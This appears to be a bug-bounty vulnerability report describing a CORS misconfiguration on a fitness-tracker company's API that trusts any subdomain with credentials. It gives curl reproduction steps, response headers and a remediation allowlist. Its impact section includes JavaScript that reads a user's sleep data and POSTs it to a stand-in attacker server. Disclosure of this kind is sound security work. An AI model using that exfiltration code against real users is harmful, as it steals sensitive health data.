# CORS Misconfiguration on api.prod.whoop.com

## Title
CORS Wildcard Subdomain Reflection with Credentials on api.prod.whoop.com Allows Cross-Origin Data Theft

## Weakness
CWE-942: Permissive Cross-domain Policy with Untrusted Domains

## Severity
High

---

## Summary

The API at `api.prod.whoop.com` reflects any `*.whoop.com` subdomain in the `Access-Control-Allow-Origin` response header and returns `Access-Control-Allow-Credentials: true`. This allows any compromised or attacker-controlled WHOOP subdomain to make authenticated cross-origin requests and read responses containing user health data.

---

## Steps to Reproduce

### Step 1: Send a request with a fake *.whoop.com origin

```bash
curl -s -D - -H "Origin: https://attacker.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic
```

### Step 2: Observe the response headers

```
HTTP/2 401
access-control-allow-credentials: true
access-control-allow-origin: https://attacker.whoop.com
access-control-allow-methods: GET, POST, PUT, DELETE, OPTIONS, HEAD
access-control-allow-headers: X-Requested-With,Content-Type,Accept,Origin,Authorization,API-TOKEN,X-Whoop-Agent,X-User-Email,X-Whoop-Refresh-Token,X-WHOOP-Installation-Identifier,X-WHOOP-reid-token,X-WHOOP-CURRENT-TOKEN,X-whoop-maverick-access
access-control-max-age: 600
```

The non-existent subdomain `attacker.whoop.com` is reflected back as a trusted origin with credentials allowed.

### Step 3: Confirm with other arbitrary subdomains

```bash
curl -s -D - -H "Origin: https://xyz123.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

Result: `access-control-allow-origin: https://xyz123.whoop.com`

```bash
curl -s -D - -H "Origin: https://test.evil.whoop.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

Result: `access-control-allow-origin: https://test.evil.whoop.com`

### Step 4: Confirm external origins are correctly blocked

```bash
curl -s -D - -H "Origin: https://evil.com" \
  https://api.prod.whoop.com/developer/v1/user/profile/basic \
  -o /dev/null 2>&1 | grep "access-control-allow-origin"
```

Result: No `access-control-allow-origin` header returned. External origins are blocked.

This confirms the server uses a wildcard/regex matching pattern like `*.whoop.com` rather than an explicit allowlist.

---

## What Was Observed (Facts Only)

1. **Any `*.whoop.com` subdomain is trusted** — including subdomains that do not exist
2. **`Access-Control-Allow-Credentials: true`** is returned — browsers will send cookies/auth tokens automatically
3. **External origins (e.g., `evil.com`) are blocked** — so this is specifically a subdomain wildcard issue
4. **The API sets cookies with `SameSite=None; Secure; Domain=prod.whoop.com`** — these cookies ARE sent on cross-origin requests
5. **The CORS policy applies to all API endpoints** including health data endpoints (`/developer/v1/activity/sleep`, `/developer/v1/recovery`, etc.)
6. **Sensitive custom headers are exposed in allow-headers**: `X-Whoop-Refresh-Token`, `X-WHOOP-CURRENT-TOKEN`, `Authorization`

---

## Impact

If an attacker gains JavaScript execution on any `*.whoop.com` subdomain (through XSS, subdomain takeover, or compromising a service hosted on a WHOOP subdomain), they can:

1. Make authenticated requests to `api.prod.whoop.com` using the victim's cookies
2. Read response data cross-origin (sleep data, heart rate, HRV, recovery scores, workout strain, body measurements)
3. This works silently with zero user interaction beyond visiting the compromised page

The data exposed is sensitive health/biometric information of WHOOP members.

**Exploit code (would execute from any *.whoop.com subdomain):**

```javascript
fetch('https://api.prod.whoop.com/developer/v1/activity/sleep', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Attacker receives victim's health data
  fetch('https://attacker-server.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Supporting Evidence

- Webhook proof sent to `https://webhook.site/0cb7bd65-2c84-47f1-9d5a-6572e2b3b62f` containing full raw HTTP response
- This pattern matches CVE-2025-34291 (Langflow, CVSS 9.4) which used the same CORS + credentials + SameSite=None combination

---

## Remediation

Replace the wildcard subdomain matching with an explicit allowlist:

```
Allowed origins:
- https://app.whoop.com
- https://join.whoop.com
- https://shop.whoop.com
- https://developer.whoop.com
```

---

*Tested: June 1, 2026 | Non-destructive, passive testing only | No user data was accessed*
